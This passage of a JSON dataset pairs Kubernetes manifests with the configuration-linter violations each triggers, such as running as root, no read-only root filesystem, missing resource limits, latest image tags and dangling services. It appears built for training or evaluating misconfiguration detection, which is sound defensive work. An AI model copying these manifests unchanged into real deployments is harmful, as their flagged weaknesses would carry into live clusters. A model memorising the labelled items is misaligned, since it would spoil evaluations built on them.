    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"agent-x\" does not have a read-only root file system"
  },
  {
    "id": "10670",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"engine-x\" does not have a read-only root file system"
  },
  {
    "id": "10671",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"log-x\" does not have a read-only root file system"
  },
  {
    "id": "10672",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"agent-x\" is not set to runAsNonRoot"
  },
  {
    "id": "10673",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"engine-x\" is not set to runAsNonRoot"
  },
  {
    "id": "10674",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"log-x\" is not set to runAsNonRoot"
  },
  {
    "id": "10675",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"agent-x\" has cpu request 0"
  },
  {
    "id": "10676",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"engine-x\" has cpu request 0"
  },
  {
    "id": "10677",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"log-x\" has cpu request 0"
  },
  {
    "id": "10678",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"agent-x\" has memory limit 0"
  },
  {
    "id": "10679",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"engine-x\" has memory limit 0"
  },
  {
    "id": "10680",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"log-x\" has memory limit 0"
  },
  {
    "id": "10681",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10682",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"counsigned\" does not have a read-only root file system"
  },
  {
    "id": "10683",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"signed-testimg\" does not have a read-only root file system"
  },
  {
    "id": "10684",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"counsigned\" is not set to runAsNonRoot"
  },
  {
    "id": "10685",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"signed-testimg\" is not set to runAsNonRoot"
  },
  {
    "id": "10686",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"counsigned\" has cpu request 0"
  },
  {
    "id": "10687",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"signed-testimg\" has cpu request 0"
  },
  {
    "id": "10688",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"counsigned\" has memory limit 0"
  },
  {
    "id": "10689",
    "manifest_path": "data/manifests/the_stack_sample/sample_4112.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: i2u2-deployment\n  labels:\n    app: i2u2\n    use: connaisseur-integration-test\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: i2u2\n  template:\n    metadata:\n      labels:\n        app: i2u2\n    spec:\n      containers:\n      - name: counsigned\n        image: securesystemsengineering/testimage:co-unsigned\n        ports:\n        - containerPort: 80\n      - name: signed-testimg\n        image: securesystemsengineering/testimage:unsigned\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"signed-testimg\" has memory limit 0"
  },
  {
    "id": "10690",
    "manifest_path": "data/manifests/the_stack_sample/sample_4113.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: keep-client-3\n  namespace: default\n  labels:\n    app: keep\n    type: beacon\n    id: '3'\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 3919\n    targetPort: 3919\n    name: tcp-3919\n  selector:\n    app: keep\n    type: beacon\n    id: '3'\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:keep id:3 type:beacon])"
  },
  {
    "id": "10691",
    "manifest_path": "data/manifests/the_stack_sample/sample_4114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20220331-00ee2c7a55\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "10692",
    "manifest_path": "data/manifests/the_stack_sample/sample_4114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20220331-00ee2c7a55\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sinker\" not found"
  },
  {
    "id": "10693",
    "manifest_path": "data/manifests/the_stack_sample/sample_4114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20220331-00ee2c7a55\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "10694",
    "manifest_path": "data/manifests/the_stack_sample/sample_4114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20220331-00ee2c7a55\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "10695",
    "manifest_path": "data/manifests/the_stack_sample/sample_4114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20220331-00ee2c7a55\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "10696",
    "manifest_path": "data/manifests/the_stack_sample/sample_4118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: snyky\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: snyky\n      app.kubernetes.io/instance: snyky\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: snyky\n        app.kubernetes.io/instance: snyky\n    spec:\n      containers:\n      - name: snyky1\n        image: garethr/snyky1:latest\n        imagePullPolicy: IfNotPresent\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"snyky1\" is using an invalid container image, \"garethr/snyky1:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10697",
    "manifest_path": "data/manifests/the_stack_sample/sample_4118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: snyky\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: snyky\n      app.kubernetes.io/instance: snyky\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: snyky\n        app.kubernetes.io/instance: snyky\n    spec:\n      containers:\n      - name: snyky1\n        image: garethr/snyky1:latest\n        imagePullPolicy: IfNotPresent\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"snyky1\" does not have a read-only root file system"
  },
  {
    "id": "10698",
    "manifest_path": "data/manifests/the_stack_sample/sample_4118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: snyky\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: snyky\n      app.kubernetes.io/instance: snyky\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: snyky\n        app.kubernetes.io/instance: snyky\n    spec:\n      containers:\n      - name: snyky1\n        image: garethr/snyky1:latest\n        imagePullPolicy: IfNotPresent\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"snyky1\" does not expose port http for the HTTPGet"
  },
  {
    "id": "10699",
    "manifest_path": "data/manifests/the_stack_sample/sample_4118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: snyky\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: snyky\n      app.kubernetes.io/instance: snyky\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: snyky\n        app.kubernetes.io/instance: snyky\n    spec:\n      containers:\n      - name: snyky1\n        image: garethr/snyky1:latest\n        imagePullPolicy: IfNotPresent\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"snyky1\" is not set to runAsNonRoot"
  },
  {
    "id": "10700",
    "manifest_path": "data/manifests/the_stack_sample/sample_4118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: snyky\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: snyky\n      app.kubernetes.io/instance: snyky\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: snyky\n        app.kubernetes.io/instance: snyky\n    spec:\n      containers:\n      - name: snyky1\n        image: garethr/snyky1:latest\n        imagePullPolicy: IfNotPresent\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"snyky1\" has cpu request 0"
  },
  {
    "id": "10701",
    "manifest_path": "data/manifests/the_stack_sample/sample_4118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: snyky\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: snyky\n      app.kubernetes.io/instance: snyky\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: snyky\n        app.kubernetes.io/instance: snyky\n    spec:\n      containers:\n      - name: snyky1\n        image: garethr/snyky1:latest\n        imagePullPolicy: IfNotPresent\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"snyky1\" has memory limit 0"
  },
  {
    "id": "10702",
    "manifest_path": "data/manifests/the_stack_sample/sample_4119.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9614\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10703",
    "manifest_path": "data/manifests/the_stack_sample/sample_4119.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9614\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10704",
    "manifest_path": "data/manifests/the_stack_sample/sample_4119.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9614\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10705",
    "manifest_path": "data/manifests/the_stack_sample/sample_4119.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9614\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10706",
    "manifest_path": "data/manifests/the_stack_sample/sample_4119.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9614\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10707",
    "manifest_path": "data/manifests/the_stack_sample/sample_4120.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongodb\nspec:\n  ports:\n  - port: 27017\n  selector:\n    app: mongodb\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mongodb])"
  },
  {
    "id": "10708",
    "manifest_path": "data/manifests/the_stack_sample/sample_4121.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2830\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
